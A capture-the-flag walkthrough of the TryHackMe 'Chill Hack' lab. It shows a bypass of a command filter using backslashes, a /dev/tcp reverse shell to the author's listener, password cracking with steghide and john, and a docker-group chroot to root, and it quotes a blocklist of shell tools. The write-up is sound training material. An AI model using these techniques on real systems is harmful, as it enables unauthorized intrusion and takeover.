# Chill Hack

## General information

<h3>Difficulty: <img src="https://img.shields.io/badge/Easy%20-green?style=flat-square"> </h3>

<h3> Operating system: Linux </h3> 

<h3> Exploited vulnerabilitya: Reverse shell and privilege escalation with Docker</h3>

<h3> DAte of resolution: 04/07/2025 </h3>

<h3>Link Machine Virtual: <a href="https://tryhackme.com/room/chillhack" target="_blank">Chill Hack</a></h3>

### *Read this document in espagnol:* <a href="chillhack.md">Chill Hack</a>

## Recognition

TryHackme provides us with the target machine's IP address **target_ip**

I'm going to set the IP address of the target machine in the **/etc/hosts** file. I'm going to call it **chill hack**.

<p align="center"> 
<img src="images/hosts.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

```
ping -c 1 chillhack
```

<p align="center"> 
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**Your ttl=63, so it's Linux**

### Open Port Scanning

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn chillhack
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version             |
| --------- | ------- | ------------------- |
| 21        | ftp     | vsftpd 3.0.5        |
| 22        | ssh     | Ubuntu 4ubuntu0.13  |
| http      | http    | Apache httpd 2.4.41 |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn chillhack
```

**No open ports**

## Exploration

### ftp

I managed to log in with the user **anonymous** via the **ftp** service

```
ftp anonymous@chillhack
ls -la
```

<p align="center"> 
<img src="images/note.png" width="600" alt="Resultado de Nmap">
</p>

```
get note.txt
cat note.txt
```
In order to download the note

```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
```
Anurodh me dijo que hay algún tipo de filtrado en las cadenas que se introducen en el comando -- Apaar
```
We have two users **anurodh** and **apaar**, I tried to brute force both users via SSH, since the port is open, but it **didn't work**

## Http

```
http://chillhack/
```

<p align="center"> 
<img src="images/chillhack.png" width="600" alt="Resultado de Nmap">
</p>

### Fuzzing web

```
gobuster dir -u http://ip_obejtivo/ -w /usr/share/wordlists/dirbuster directory-list-lowercase-2.3-medium.txt 
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

This **secret** route really catches my attention.

```
http://chillhack/secret/
```

We can run commands like:

```
whoami
```

<p align="center"> 
<img src="images/www.png" width="600" alt="Resultado de Nmap">
</p>

Then if I put command like

```
ls
```

<p align="center"> 
<img src="images/hacker.png" width="600" alt="Resultado de Nmap">
</p>

I look at the source code to see if I can find any information... **and I find nothing**

Then, I remember in a cybersecurity class at my Alan Turing school, that there was another way to write commands, using a **backslash*, for example: ls --> l\s

```
l\s
```

<p align="center"> 
<img src="images/ls.png" width="600" alt="Resultado de Nmap">
</p>

```
c\at index.php
```

<p align="center"> 
<img src="images/index.png" width="600" alt="Resultado de Nmap">
</p>

I am surprised to find that the following commands are restricted, such as **('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');**. Therefore, I decided to use a reverse shell but with a backslash.

## Exploitation

Before we prepare the listening port in a terminal:

```
sudo nc -lvnp 4444
```

Then we launch this command:

```
b\ash -c "sh -i >& /dev/tcp/10.8.139.36/4444 0>&1"
whoami
```

<p align="center"> 
<img src="images/data.png" width="600" alt="Resultado de Nmap">
</p>

I try to go for the first flag which is the user flag, and I find that I cannot access it.

<p align="center"> 
<img src="images/photo.png" width="600" alt="Resultado de Nmap">
</p>

## Post Explotation

#### TTY

```
script /dev/null -c bash
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

### Privilege Escalation

#### First attempt:

```
sudo -l
```

<p align="center"> 
<img src="images/sudo.png" width="600" alt="Resultado de Nmap">
</p>

```
sudo -u apaar /home/apaar/.helpline.sh
```

<p align="center"> 
<img src="images/daniel.png" width="600" alt="Resultado de Nmap">
</p>

I'll explain a little what I've done, when I run the sudo -l command, I get a recommendation that if I run this command **sudo -u apaar /home/apaar/.helpline.sh** it will ask me for my name and then ask me to enter a message which in my case I'll type **bash**. Then, I run the TTY command again and get the apaar session, now let's go for that FLAG


```
cat local.txt
```

<p align="center"> 
<img src="images/local.png" width="600" alt="Resultado de Nmap">
</p>

Then I find myself in the situation where I need to escalate to root for the second flag

#### Segundo intento:

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/pk.png" width="600" alt="Resultado de Nmap">
</p>

I'm trying to exploit the **pkexec** vulnerability but I can't.

#### Tercer intento

I run **linpeas**, which is a scanning tool. If you don't know what it is, I recommend you research how it works; it's very useful!

```
.\linpeas.sh
```

<p align="center"> 
<img src="images/linpeas.png" width="600" alt="Resultado de Nmap">
</p>

I try to handle this vulnerability, and **I'm not able to either.** I'm desperate, and I decide to start over.

#### Cuarto Intento

While investigating I find an image.

<p align="center"> 
<img src="images/pwd.png" width="600" alt="Resultado de Nmap">
</p>

I share the file:

```
python3 -m http.server 80
```

Then I use the **wget** command to download it. I use a stenography tool:

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

There's a zip file inside, but it's encrypted. So I use john de ripper to decrypt the password:

```
zip2john backup.zip > contraseña.txt
john --wordlist=/usr/share/wordlists/rockyou.txt contraseña.txt
```

In my case, as I already did, I show it to you with the following command:

```
john --show contraseña.txt
```

<p align="center"> 
<img src="images/john.png" width="600" alt="Resultado de Nmap">
</p>

Then, I come across this file **source_code.php**

```
nano source_code.php
```

<p align="center"> 
<img src="images/code.png" width="600" alt="Resultado de Nmap">
</p>

I am surprised to find that we have the user **anurodh** and his password IWQwbnRLbjB3bVlwQHNzdzByZA== in base 64

```
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
```

<p align="center"> 
<img src="images/base.png" width="600" alt="Resultado de Nmap">
</p>

**User: anurodh**
**Password: !d0ntKn0wmYp@ssw0rd** 

I use ssh with the anurodh user

```
ssh anurodh@chillhack
```

<p align="center"> 
<img src="images/au.png" width="600" alt="Resultado de Nmap">
</p>

Then I use this command and we look here:

```
id
```

<p align="center"> 
<img src="images/id.png" width="600" alt="Resultado de Nmap">
</p>

When you open shell with docker we can try the following command, to escalate privilege, you will find it <a href="https://gtfobins.github.io" target="_blank">here</a> Type **docker** in the browser and go to the **shell** section

<p align="center"> 
<img src="images/shell.png" width="600" alt="Resultado de Nmap">
</p>

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

Sometimes this even seems so easy, eh? I'm hallucinating... If only you knew how long I've been stuck on this part.

The root FLAG

<p align="center"> 
<img src="images/flag2.png" width="600" alt="Resultado de Nmap">
</p>

**Finished machine**

## Conclusion

This machine stands out especially because it allowed me to review almost everything I've learned during my preparation for the **eJPTv2** certification: from using **John the Ripper**, **Base64** decoding, to handling a **reverse shell**.

One of the parts that frustrated me the most was not being able to run certain commands, like `cat`, directly from the browser. After some thought, I realized it was a restriction I could bypass by using a backslash (`\`) before the command. That small detail made all the difference.

As for **privilege escalation**, I tried several techniques that had worked for me on other machines, but none of them worked. Finally, after some research, I discovered a simple way to escalate privileges by taking advantage of the user's membership in the **docker** group. This technique was totally new to me, and I found it very interesting because of how easy it is to compromise the system from there.

In short, every machine is an opportunity to learn something new. I definitely recommend this one.